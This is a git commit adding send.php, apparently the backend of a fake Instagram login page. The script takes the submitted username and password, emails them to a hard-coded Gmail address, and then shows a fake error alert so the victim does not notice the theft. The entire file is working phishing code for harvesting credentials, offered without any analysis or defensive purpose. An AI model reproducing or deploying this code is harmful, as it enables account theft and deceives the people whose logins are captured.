d756748520be407e39f962fd5dfba5e7115a2f01
Abhijeet kumar <80936610+Abhijeetbyte@users.noreply.github.com>
2022-06-15 22:11:52 +0530

    Add files via upload

---
+++ send.php
@@ -0,0 +1,28 @@
+<?php
+
+//varible setting
+$username = $_REQUEST['u_name'];  // fetch username
+ $passcode = $_REQUEST['pass'];  // fetch password
+ $subject = "Someone Login ! Insta Dummy page";
+ $to ="dummyducky0@gmail.com";
+ 
+ $txt = "Username : ". $username. "\r\nPassword : ". $passcode ; // email body (i) username [break] (ii) password;
+ 
+
+
+// check input fields
+if (empty($username)|| empty($passcode)){ // name or message
+echo"<script type='text/javascript'>alert('Please enter correct username or password. Try again ');
+    window.history.go(-1);
+    </script>";
+}
+else 
+{ 
+    mail($to,$subject,$txt); // send an email 
+    echo"<script type='text/javascript'>alert('Sorry ! unable to open ');
+    window.history.go(-1);
+    </script>";
+}
+
+
+?>
